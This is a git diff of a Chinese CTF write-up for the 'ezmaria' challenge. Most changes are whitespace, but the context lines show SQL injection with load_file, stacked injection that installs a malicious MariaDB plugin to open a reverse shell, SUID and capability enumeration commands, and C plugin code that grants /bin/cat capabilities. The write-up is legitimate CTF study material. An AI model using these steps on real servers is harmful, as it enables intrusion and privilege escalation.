@@ -1,6 +1,7 @@
 # N1CTF ezmaria writeup
 - 第一步  
     尝试用load_file读取源码
+    
     ```
     id=0 union select 1, load_file('/var/www/html/index.php')
     ```
@@ -9,10 +10,11 @@
     mariadbd --skip-grant-tables --secure-file-priv= --datadir=/mysql/data --plugin_dir=/mysql/plugin --user=mysql
     ```
     可以看到mysql的plugin目录是`/mysql/plugin`以及`secure-file-priv`是空的，过滤了outfile但没有过滤dumpfile，而且使用的是multi_query，可以进行堆叠注入  
-
+    
 - 第二步  
     写插件并且加载，反弹shell  
     恢复mysql的表，因为用skip-grant-tables启动
+    
     ```
     CREATE DATABASE IF NOT EXISTS mysql;
     use mysql;
@@ -49,19 +51,21 @@
     ```
     最后安装插件反弹shell  
     ```INSTALL PLUGIN plugin_name SONAME 'lolita.so'```
-
+    
 - 第三步  
     可以看到/flag没有权限读取，找suid和cap
+    
     ```
     find / -user root -perm -4000 -print 2>/dev/null
     getcap -r / 2>/dev/null
-
+    
     /usr/bin/mariadb cap_setfcap=ep
     ```
     可以看到/usr/bin/mariadb有cap_setfcap权限
     参考`https://blog.csdn.net/xdy762024688/article/details/132237969`  
     也就是我们能给其他文件设置cap  
     给mariadb写个插件
+    
     ```
     #include <stdlib.h>
     #include <stdio.h>
@@ -75,7 +79,7 @@
         cap_set_file("/bin/cat", caps);
         printf("setcap finished\n");
     }
-
+    
     class LOLITA {
     public:
         LOLITA(){
@@ -94,4 +98,3 @@
 
 - 赛后总结  
     hint没放好，`skip-grant-tables`这一步很容易想不到，最后还是有8个队伍做出来了  
-    
